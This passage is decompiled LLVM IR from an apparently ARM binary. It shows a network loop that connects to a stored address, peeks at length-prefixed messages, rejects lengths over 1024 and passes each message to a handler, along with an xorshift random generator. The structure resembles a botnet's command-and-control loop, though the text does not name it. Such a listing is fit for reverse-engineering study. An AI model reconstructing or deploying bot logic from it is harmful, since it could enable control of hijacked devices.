  %v2_fa0c = call i32 @function_1347c(i32 %stack_var_-1620.0, i32 6)
  %v2_fa14 = icmp eq i32 %v2_fa0c, 0
  %v1_fa18 = add i32 %stack_var_-1620.0, 1
  store i32 %v1_fa18, i32* %r2.global-to-local, align 4
  br i1 %v2_fa14, label %dec_label_pc_fc74, label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9f4, %dec_label_pc_f9fc, %dec_label_pc_fc74
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_fc74 ], [ 0, %dec_label_pc_f9fc ], [ %stack_var_-37.0, %dec_label_pc_f9f4 ]
  %stack_var_-1620.1 = phi i32 [ %v1_fa18, %dec_label_pc_fc74 ], [ %v1_fa18, %dec_label_pc_f9fc ], [ %stack_var_-1620.0, %dec_label_pc_f9f4 ]
  store i32 ptrtoint (i32* @global_var_1ea4c.111 to i32), i32* %r3.global-to-local, align 4
  %v2_fa28 = load i32, i32* @global_var_1ea4c.111, align 4
  %v7_fa2c = icmp eq i32 %v2_fa28, -1
  br i1 %v7_fa2c, label %dec_label_pc_fa5c, label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa24
  %v3_fa34 = udiv i32 %v2_fa28, 32
  %v3_fa3c = mul nuw nsw i32 %v3_fa34, 4
  %v2_fa44 = add i32 %v3_fa3c, %v2_f7a0
  store i32 %v2_fa44, i32* %r3.global-to-local, align 4
  %v1_fa48 = add i32 %v2_fa44, -556
  %v2_fa48 = inttoptr i32 %v1_fa48 to i32*
  %v3_fa48 = load i32, i32* %v2_fa48, align 4
  %v1_fa4c = urem i32 %v2_fa28, 32
  %v6_fa50 = lshr i32 %v3_fa48, %v1_fa4c
  store i32 %v6_fa50, i32* %r2.global-to-local, align 4
  %v1_fa54 = urem i32 %v6_fa50, 2
  %v2_fa54 = icmp eq i32 %v1_fa54, 0
  br i1 %v2_fa54, label %dec_label_pc_fa5c, label %dec_label_pc_fcf4

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa34, %dec_label_pc_fa24
  store i32 ptrtoint (i8** @global_var_1ebec.154 to i32), i32* %r3.global-to-local, align 4
  %v2_fa60 = load i8, i8* bitcast (i8** @global_var_1ebec.154 to i8*), align 4
  %v3_fa60 = zext i8 %v2_fa60 to i32
  store i32 %v3_fa60, i32* @r4, align 4
  %v2_fa64 = icmp eq i8 %v2_fa60, 0
  %v2_faf4 = load i32, i32* @global_var_1ea50.151, align 4
  br i1 %v2_fa64, label %dec_label_pc_faf4, label %dec_label_pc_fa6c

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa5c
  %v3_fa74 = udiv i32 %v2_faf4, 32
  %v3_fa7c = mul nuw nsw i32 %v3_fa74, 4
  %v2_fa80 = add i32 %v3_fa7c, %v2_f7a0
  store i32 %v2_fa80, i32* %r3.global-to-local, align 4
  %v1_fa84 = add i32 %v2_fa80, -300
  %v2_fa84 = inttoptr i32 %v1_fa84 to i32*
  %v3_fa84 = load i32, i32* %v2_fa84, align 4
  %v1_fa88 = urem i32 %v2_faf4, 32
  %v6_fa8c = lshr i32 %v3_fa84, %v1_fa88
  store i32 %v6_fa8c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ebec.154 to i32), i32* %r3.global-to-local, align 4
  %v1_fa98 = urem i32 %v6_fa8c, 2
  %v2_fa98 = icmp eq i32 %v1_fa98, 0
  store i8 0, i8* bitcast (i8** @global_var_1ebec.154 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1ea50.151 to i32), i32* @r5, align 4
  br i1 %v2_fa98, label %dec_label_pc_faa8, label %dec_label_pc_fc94

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa6c
  store i32 64176, i32* @lr, align 4
  %v1_faac = icmp ne i32 %v2_faf4, -1
  call void @__pseudo_cond_branch(i1 %v1_faac, i32 ptrtoint (i32* @global_var_13654.26 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fab4 = load i32, i32* @r5, align 4
  %v2_fab4 = inttoptr i32 %v1_fab4 to i32*
  store i32 -1, i32* %v2_fab4, align 4
  %v1_fabc = call i32 @function_14a84(i32 1)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fac4:                                ; preds = %dec_label_pc_f96c
  store i32 %v2_f7a0, i32* %r2.global-to-local, align 4
  %v3_fad4 = mul nuw nsw i32 %v3_facc, 4
  %v2_fad8 = add i32 %v3_fad4, %v2_f7a0
  store i32 %v2_fad8, i32* %r3.global-to-local, align 4
  %v1_fadc = add i32 %v2_fad8, -556
  %v2_fadc = inttoptr i32 %v1_fadc to i32*
  %v3_fadc = load i32, i32* %v2_fadc, align 4
  %v1_fae0 = urem i32 %v2_fac4, 32
  %v7_fae8 = shl i32 1, %v1_fae0
  %v8_fae8 = or i32 %v3_fadc, %v7_fae8
  store i32 %v8_fae8, i32* %r2.global-to-local, align 4
  store i32 %v8_fae8, i32* %v2_fadc, align 4
  br label %dec_label_pc_f9a8

dec_label_pc_faf4:                                ; preds = %dec_label_pc_fa5c
  %v7_faf8 = icmp eq i32 %v2_faf4, -1
  store i32 ptrtoint (i32* @global_var_1ea50.151 to i32), i32* @r5, align 4
  br i1 %v7_faf8, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %dec_label_pc_faf4
  %v3_fb04 = udiv i32 %v2_faf4, 32
  store i32 %v2_f7a0, i32* %r2.global-to-local, align 4
  %v3_fb10 = mul nuw nsw i32 %v3_fb04, 4
  %v2_fb14 = add i32 %v3_fb10, %v2_f7a0
  store i32 %v2_fb14, i32* %r3.global-to-local, align 4
  %v1_fb18 = add i32 %v2_fb14, -556
  %v2_fb18 = inttoptr i32 %v1_fb18 to i32*
  %v3_fb18 = load i32, i32* %v2_fb18, align 4
  %v1_fb1c = urem i32 %v2_faf4, 32
  %v6_fb20 = lshr i32 %v3_fb18, %v1_fb1c
  store i32 %v6_fb20, i32* %r2.global-to-local, align 4
  %v1_fb24 = urem i32 %v6_fb20, 2
  %v2_fb24 = icmp eq i32 %v1_fb24, 0
  br i1 %v2_fb24, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb04
  %v0_fb2c = call i32 @function_13c28()
  %v0_fb30 = load i32, i32* @r4, align 4
  %v2_fb30 = inttoptr i32 %v0_fb2c to i32*
  store i32 %v0_fb30, i32* %v2_fb30, align 4
  store i32 %v0_fb2c, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_fb44 = load i32, i32* @global_var_1ea50.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_fb50 = call i32 @function_13e60(i32 %v2_fb44, i32* %v5_fc8c, i32 2, i32 16386)
  %v7_fb54 = icmp eq i32 %v5_fb50, -1
  br i1 %v7_fb54, label %dec_label_pc_fd94, label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %dec_label_pc_fb2c
  %v2_fb5c = icmp eq i32 %v5_fb50, 0
  br i1 %v2_fb5c, label %dec_label_pc_fbe0, label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb5c
  %v3_fb64 = load i8, i8* %stack_var_-38, align 1
  %v4_fb64 = sext i8 %v3_fb64 to i32
  %v4_fb68 = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_fb68, i32* %r3.global-to-local, align 4
  %v4_fb6c = mul nuw nsw i32 %v4_fb68, 256
  %v5_fb6c = or i32 %v4_fb64, %v4_fb6c
  store i32 %v5_fb6c, i32* %r2.global-to-local, align 4
  %v7_fb6c = icmp eq i32 %v5_fb6c, 0
  br i1 %v7_fb6c, label %dec_label_pc_fda8, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb64
  %v1_fb74 = mul nsw i32 %v4_fb64, 256
  %v3_fb78 = and i32 %v1_fb74, 65280
  %v4_fb7c = udiv i32 %v5_fb6c, 256
  %v5_fb7c = or i32 %v3_fb78, %v4_fb7c
  store i32 %v5_fb7c, i32* %r3.global-to-local, align 4
  %v3_fb804 = udiv i32 %v5_fb7c, 256
  store i32 %v3_fb804, i32* %r2.global-to-local, align 4
  %v1_fb88 = trunc i32 %v3_fb804 to i8
  %v6_fb8c = trunc i32 %v4_fb7c to i8
  store i8 %v6_fb8c, i8* %stack_var_-38, align 1
  %tmp103 = icmp ult i32 %v5_fb7c, 1025
  br i1 %tmp103, label %dec_label_pc_fba4, label %dec_label_pc_fb94

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb74
  %v2_fb94 = load i32, i32* @global_var_1ea50.151, align 4
  %v1_fb98 = call i32 @function_13654(i32 %v2_fb94)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fba0 = load i32, i32* @r5, align 4
  %v2_fba0 = inttoptr i32 %v1_fba0 to i32*
  store i32 -1, i32* %v2_fba0, align 4
  %v3_fbac.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb74, %dec_label_pc_fb94
  %v3_fbac = phi i8 [ %v6_fb8c, %dec_label_pc_fb74 ], [ %v3_fbac.pre, %dec_label_pc_fb94 ]
  %v0_fba4 = load i32, i32* @r4, align 4
  %v1_fba4 = load i32, i32* @r8, align 4
  %v2_fba4 = inttoptr i32 %v1_fba4 to i32*
  store i32 %v0_fba4, i32* %v2_fba4, align 4
  %v4_fba8 = urem i32 %v3_fb804, 256
  %v4_fbac = sext i8 %v3_fbac to i32
  store i32 %v2_fbb4, i32* @r4, align 4
  %v4_fbbc = mul nuw nsw i32 %v4_fba8, 256
  %v5_fbbc = or i32 %v4_fbac, %v4_fbbc
  store i32 %v5_fbbc, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_fbc4 = load i32, i32* @global_var_1ea50.151, align 4
  %v5_fbcc = call i32 @function_13e60(i32 %v2_fbc4, i32* nonnull %stack_var_-1616, i32 %v5_fbbc, i32 16386)
  %v7_fbd0 = icmp eq i32 %v5_fbcc, -1
  br i1 %v7_fbd0, label %dec_label_pc_fd94, label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fba4
  %v2_fbd8 = icmp eq i32 %v5_fbcc, 0
  br i1 %v2_fbd8, label %dec_label_pc_fbe0, label %dec_label_pc_fdc4

dec_label_pc_fbe0:                                ; preds = %bb86, %dec_label_pc_fbd8, %dec_label_pc_fb5c
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.1, %dec_label_pc_fb5c ], [ %v1_fb88, %dec_label_pc_fbd8 ]
  %v2_fbe0 = load i32, i32* @global_var_1ea50.151, align 4
  store i32 64492, i32* @lr, align 4
  %v1_fbe8 = icmp ne i32 %v2_fbe0, -1
  call void @__pseudo_cond_branch(i1 %v1_fbe8, i32 ptrtoint (i32* @global_var_13654.26 to i32))
  store i32 ptrtoint (i32* @global_var_1ea50.151 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1ea50.151, align 4
  %v1_fbfc = call i32 @function_14a84(i32 1)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fc04:                                ; preds = %dec_label_pc_f95c
  %v0_fc0c = load i32, i32* @r4, align 4
  store i32 %v0_fc0c, i32* %r2.global-to-local, align 4
  %v3_fc10 = call i32 @function_13f50(i32 2, i32 1, i32 %v0_fc0c)
  %v7_fc14 = icmp eq i32 %v3_fc10, -1
  store i32 %v3_fc10, i32* %r5.global-to-local, align 4
  %v1_fc1c = load i32, i32* %r8.global-to-local, align 4
  %v2_fc1c = inttoptr i32 %v1_fc1c to i32*
  store i32 %v3_fc10, i32* %v2_fc1c, align 4
  br i1 %v7_fc14, label %dec_label_pc_f96c, label %dec_label_pc_fc24

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fc04
  %v0_fc24 = load i32, i32* @r4, align 4
  store i32 %v0_fc24, i32* @r2, align 4
  %v2_fc2c = call i32 @function_13564(i32 %v3_fc10, i32 3)
  %v1_fc34 = or i32 %v2_fc2c, 2048
  store i32 %v1_fc34, i32* @r2, align 4
  %v0_fc38 = load i32, i32* %r5.global-to-local, align 4
  %v2_fc3c = call i32 @function_13564(i32 %v0_fc38, i32 4)
  %v2_fc44 = load i32, i32* @global_var_1ea54.109, align 4
  store i32 %v2_fc44, i32* %r3.global-to-local, align 4
  %v2_fc48 = icmp eq i32 %v2_fc44, 0
  br i1 %v2_fc48, label %.thread, label %bb85

bb85:                                             ; preds = %dec_label_pc_fc24
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_12f4c.156 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fc24, %bb85
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_fc5c = load i32, i32* @global_var_1ea50.151, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1ebec.154 to i8*), align 4
  %v5_fc6c = call i32 @function_13dac(i32 %v2_fc5c, %sockaddr* bitcast (i8** @global_var_1ec88.116 to %sockaddr*), i32 16)
  br label %dec_label_pc_f96c

dec_label_pc_fc74:                                ; preds = %dec_label_pc_f9fc
  %v2_fc7c = load i32, i32* @global_var_1ea50.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_fc8c = call i32 @function_13ec0(i32 %v2_fc7c, i32* nonnull %v5_fc8c, i32 2, i32 16384)
  br label %dec_label_pc_fa24

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fa6c
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_fca4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v6_fcbc = call i32 @function_13e04(i32 %v2_faf4, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_fca8)
  %v3_fcc0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_fcc0, i32* %r3.global-to-local, align 4
  %v2_fcc4 = icmp eq i32 %v3_fcc0, 0
  br i1 %v2_fcc4, label %dec_label_pc_fd34, label %dec_label_pc_fccc

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fc94
  %v2_fccc = load i32, i32* @global_var_1ea50.151, align 4
  %v1_fcd0 = call i32 @function_13654(i32 %v2_fccc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fcd8 = load i32, i32* @r5, align 4
  %v2_fcd8 = inttoptr i32 %v1_fcd8 to i32*
  store i32 -1, i32* %v2_fcd8, align 4
  %v0_fcdc = call i32 @function_fe60()
  %v2_fce4 = call i32 @function_133b0(i32 %v0_fcdc, i32 10)
  %v1_fce8 = add i32 %v2_fce4, 1
  %v1_fcec = call i32 @function_14a84(i32 %v1_fce8)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_f8f4.backedge:                       ; preds = %dec_label_pc_fccc, %dec_label_pc_fd80, %dec_label_pc_fda8, %dec_label_pc_fe18, %dec_label_pc_faa8, %dec_label_pc_fbe0, %dec_label_pc_fd34, %bb86, %dec_label_pc_fdc4, %bb84, %dec_label_pc_faf4, %dec_label_pc_fb04, %dec_label_pc_fd94
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb84 ], [ %stack_var_-37.1, %dec_label_pc_faf4 ], [ %stack_var_-37.1, %dec_label_pc_fb04 ], [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.2, %dec_label_pc_fbe0 ], [ %stack_var_-37.1, %dec_label_pc_fda8 ], [ %v3_fddc, %dec_label_pc_fdc4 ], [ %v3_fddc, %dec_label_pc_fe18 ], [ %stack_var_-37.1, %dec_label_pc_faa8 ], [ %stack_var_-37.1, %dec_label_pc_fd34 ], [ %stack_var_-37.1, %dec_label_pc_fd80 ], [ %stack_var_-37.1, %dec_label_pc_fccc ], [ %stack_var_-37.3, %dec_label_pc_fd94 ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb84 ], [ %stack_var_-1620.1, %dec_label_pc_faf4 ], [ %stack_var_-1620.1, %dec_label_pc_fb04 ], [ %stack_var_-1620.1, %bb86 ], [ %stack_var_-1620.1, %dec_label_pc_fbe0 ], [ %stack_var_-1620.1, %dec_label_pc_fda8 ], [ %stack_var_-1620.1, %dec_label_pc_fdc4 ], [ %stack_var_-1620.1, %dec_label_pc_fe18 ], [ %stack_var_-1620.1, %dec_label_pc_faa8 ], [ %stack_var_-1620.1, %dec_label_pc_fd34 ], [ %stack_var_-1620.1, %dec_label_pc_fd80 ], [ %stack_var_-1620.1, %dec_label_pc_fccc ], [ %stack_var_-1620.1, %dec_label_pc_fd94 ]
  %v2_f8fc87.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f8f4

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fa34
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_fca4, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_fd0c = call i32 @function_13d54(i32 %v2_fa28, %sockaddr* %v5_fd0c, i32 %v2_fca4, i32 16, i32 16)
  %v1_fd10 = call i32 @function_10690(i32 %v6_fd0c)
  %v1_fd14 = call i32 @function_e530(i32 %v1_fd10)
  %v1_fd18 = call i32 @function_a32c(i32 %v1_fd14)
  store i32 %v1_f8b0, i32* %r2.global-to-local, align 4
  %v2_fd28 = call i32 @function_13754(i32 %v1_fd24, i32 9)
  %v1_fd30 = call i32 @function_149f0(i32 0)
  br label %dec_label_pc_fd34

dec_label_pc_fd34:                                ; preds = %dec_label_pc_fc94, %dec_label_pc_fcf4
  %v2_fd38 = call i32 @function_12c94(i8* %v1_fd38)
  %v3_fd38 = trunc i32 %v2_fd38 to i8
  store i8 %v3_fd38, i8* %stack_var_-38, align 1
  %v0_fd40 = call i32 @function_12f4c()
  %v0_fd44 = load i32, i32* @r4, align 4
  store i32 %v0_fd44, i32* %r2.global-to-local, align 4
  %v1_fd48 = load i32, i32* @fp, align 4
  %v2_fd48 = inttoptr i32 %v1_fd48 to i32*
  store i32 %v0_fd40, i32* %v2_fd48, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd54 = load i32, i32* @r5, align 4
  %v1_fd54 = inttoptr i32 %v0_fd54 to i32*
  %v2_fd54 = load i32, i32* %v1_fd54, align 4
  %v5_fd58 = call i32 @function_13ec0(i32 %v2_fd54, i32* nonnull @global_var_15f98.158, i32 %v0_fd44, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_fd64 = load i32, i32* @r5, align 4
  %v1_fd64 = inttoptr i32 %v0_fd64 to i32*
  %v2_fd64 = load i32, i32* %v1_fd64, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd70 = call i32 @function_13ec0(i32 %v2_fd64, i32* %v5_fc8c, i32 1, i32 16384)
  %v3_fd74 = load i8, i8* %stack_var_-38, align 1
  %v4_fd74 = sext i8 %v3_fd74 to i32
  store i32 %v4_fd74, i32* %r2.global-to-local, align 4
  %v2_fd78 = icmp eq i8 %v3_fd74, 0
  br i1 %v2_fd78, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd34
  %v0_fd80 = load i32, i32* @r5, align 4
  %v1_fd80 = inttoptr i32 %v0_fd80 to i32*
  %v2_fd80 = load i32, i32* %v1_fd80, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fd8c = call i32 @function_13ec0(i32 %v2_fd80, i32* nonnull %stack_var_-138, i32 %v4_fd74, i32 16384)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fba4, %dec_label_pc_fb2c
  %stack_var_-37.3 = phi i8 [ %stack_var_-37.1, %dec_label_pc_fb2c ], [ %v1_fb88, %dec_label_pc_fba4 ]
  %v0_fd94 = load i32, i32* @r8, align 4
  %v1_fd94 = inttoptr i32 %v0_fd94 to i32*
  %v2_fd94 = load i32, i32* %v1_fd94, align 4
  store i32 %v2_fd94, i32* %r3.global-to-local, align 4
  %v7_fd98 = icmp eq i32 %v2_fd94, 4
  br i1 %v7_fd98, label %dec_label_pc_f8f4.backedge, label %bb86

bb86:                                             ; preds = %dec_label_pc_fd94
  %v8_fd9c = icmp eq i32 %v2_fd94, 11
  br i1 %v8_fd9c, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fbe0

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fb64
  %v2_fdac = load i32, i32* @global_var_1ea50.151, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_fdbc = call i32 @function_13e60(i32 %v2_fdac, i32* nonnull %v5_fc8c, i32 2, i32 16384)
  br label %dec_label_pc_f8f4.backedge

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fbd8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_fdd4 = load i32, i32* @global_var_1ea50.151, align 4
  %v5_fdd8 = call i32 @function_13e60(i32 %v2_fdd4, i32* nonnull %v5_fc8c, i32 2, i32 16384)
  %v3_fddc = load i8, i8* %stack_var_-38, align 1
  %v4_fddc = sext i8 %v3_fddc to i32
  %v4_fde4 = mul nsw i32 %v4_fddc, 256
  %v5_fde4 = or i32 %v4_fde4, %v4_fba8
  store i32 %v5_fde4, i32* %r2.global-to-local, align 4
  store i32 %v4_fddc, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_fdf8 = load i32, i32* @global_var_1ea50.151, align 4
  store i8 %v1_fb88, i8* %stack_var_-38, align 1
  %v8_fe04 = call i32 @function_13e60(i32 %v2_fdf8, i32* nonnull %stack_var_-1616, i32 %v5_fde4, i32 16384)
  %v3_fe08 = load i8, i8* %stack_var_-38, align 1
  %v4_fe08 = sext i8 %v3_fe08 to i32
  store i32 %v4_fe08, i32* %r2.global-to-local, align 4
  %v4_fe0c = zext i8 %v3_fddc to i32
  store i32 %v4_fe0c, i32* %r3.global-to-local, align 4
  %v4_fe10 = mul nuw nsw i32 %v4_fe0c, 256
  %v5_fe10 = or i32 %v4_fe08, %v4_fe10
  %v7_fe10 = icmp eq i32 %v5_fe10, 0
  br i1 %v7_fe10, label %dec_label_pc_f8f4.backedge, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fdc4
  %v5_fe1c = call i32 @function_a0d8(i32* nonnull %stack_var_-1616, i32 %v5_fe10, i32 %v4_fe08, i32 %v4_fe0c)
  br label %dec_label_pc_f8f4.backedge

; uselistorder directives
  uselistorder i32 %v4_fe0c, { 1, 0, 2 }
  uselistorder i32 %v4_fe08, { 1, 0, 2 }
  uselistorder i32 %v4_fddc, { 1, 0 }
  uselistorder i8 %v3_fddc, { 2, 3, 1, 0 }
  uselistorder i8 %stack_var_-37.3, { 2, 1, 0 }
  uselistorder i32 %v3_fc10, { 3, 2, 1, 0 }
  uselistorder i32 %v5_fbcc, { 1, 0 }
  uselistorder i32 %v4_fba8, { 1, 0 }
  uselistorder i8 %v1_fb88, { 0, 2, 1 }
  uselistorder i32 %v3_fb804, { 0, 2, 1 }
  uselistorder i32 %v4_fb7c, { 1, 0 }
  uselistorder i32 %v5_fb50, { 1, 0 }
  uselistorder i32 %v2_faf4, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_fa28, { 3, 2, 1, 0 }
  uselistorder i8 %stack_var_-37.1, { 9, 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %v5_f9e4, { 2, 1, 0 }
  uselistorder i32 %v2_f928, { 2, 1, 0 }
  uselistorder i32 %v1_f918, { 1, 2, 0 }
  uselistorder i32 %v1_f900, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1620.0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_fca4, { 1, 0, 2 }
  uselistorder i32* %v5_fc8c, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v2_f8f0, { 1, 0, 2 }
  uselistorder i32 %v2_f8ec, { 1, 0, 2 }
  uselistorder i32 %v4_f858, { 1, 2, 0 }
  uselistorder i32 %v2_f7a0, { 0, 9, 1, 10, 2, 3, 4, 5, 8, 6, 11, 7 }
  uselistorder i32 %v1_f6ec, { 1, 2, 0 }
  uselistorder i32 %v0_f6e8, { 1, 0 }
  uselistorder i32 %v1_f6bc, { 1, 0 }
  uselistorder i32 %v0_f6b0, { 1, 0 }
  uselistorder i32 %v1_f688, { 1, 0 }
  uselistorder i32 %v0_f67c, { 1, 0 }
  uselistorder i32 %v1_f654, { 1, 0 }
  uselistorder i32 %v0_f648, { 1, 0 }
  uselistorder i32 %v1_f620, { 1, 0 }
  uselistorder i32 %v0_f610, { 1, 0 }
  uselistorder i32 %v0_f5ec, { 1, 0 }
  uselistorder i32 %v2_f528, { 0, 2, 1 }
  uselistorder i32 %v4_f4c8, { 1, 2, 0 }
  uselistorder i32 %v2_f470, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-36, { 0, 2, 3, 1 }
  uselistorder i32* %stack_var_-48, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-106, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-138, { 1, 2, 0, 3 }
  uselistorder i8* %stack_var_-38, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-1616, { 1, 0, 2, 3 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 42, 43, 26, 27, 23, 40, 41, 24, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* @global_var_1ea54.109, { 1, 0 }
  uselistorder i32 16386, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* bitcast (i8** @global_var_1ebec.154 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1ebec.154, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ebec.154 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1ea4c.111, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_1ea50.151, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 13, 12, 14, 15 }
  uselistorder i32 (i8*, i32)* @function_12cbc, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 66, 36, 37, 38, 39, 40, 61, 62, 63, 64, 65, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 (i32, i32)* @function_ff14, { 2, 1, 0 }
  uselistorder i32 ()* @function_f260, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ec88.116 to i32), { 1, 0 }
  uselistorder [2 x i8]* @global_var_15f20.23, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_f248.121 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_13fdc, { 1, 0 }
  uselistorder label %dec_label_pc_fd34, { 1, 0 }
  uselistorder label %dec_label_pc_f8f4.backedge, { 3, 8, 2, 7, 12, 1, 6, 0, 5, 11, 10, 4, 9 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fba4, { 1, 0 }
  uselistorder label %dec_label_pc_fa24, { 2, 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_f96c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f95c, { 1, 0 }
  uselistorder label %dec_label_pc_f914.dec_label_pc_f914_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f754, { 2, 0, 1 }
}

define i32 @function_fe60() local_unnamed_addr {
dec_label_pc_fe60:
  %v2_fe6c = load i32, i32* @global_var_1ebf0.160, align 4
  %v2_fe70 = load i32, i32* @global_var_1ebfc.162, align 4
  store i32 ptrtoint (i32* @global_var_1ebf4.164 to i32), i32* @lr, align 4
  %v4_fe7c = mul i32 %v2_fe6c, 2048
  %v5_fe7c = xor i32 %v4_fe7c, %v2_fe6c
  %v4_fe80 = udiv i32 %v2_fe70, 524288
  %v5_fe80 = xor i32 %v4_fe80, %v2_fe70
  %v2_fe84 = load i32, i32* @global_var_1ebf4.164, align 4
  %v2_fe88 = load i32, i32* @global_var_1ebf8.166, align 4
  %v2_fe8c = xor i32 %v5_fe80, %v5_fe7c
  %v4_fe90 = udiv i32 %v5_fe7c, 256
